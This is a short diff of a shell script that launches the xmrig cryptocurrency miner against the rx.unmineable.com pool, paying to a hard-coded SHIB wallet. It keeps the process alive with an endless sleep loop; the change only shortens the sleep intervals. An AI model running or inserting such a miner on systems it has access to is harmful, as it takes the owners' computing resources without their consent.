@@ -8,6 +8,6 @@ cd xmrig-6.12.2
 chmod u+x shib
 ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x5c1bb86fd9f58fb2b33bc6e3a0e5a0932ecabb1f.rk1 -p x
 while [ 1 ]; do
-sleep 3
+sleep 2
 done 
-sleep 99999999
+sleep 999
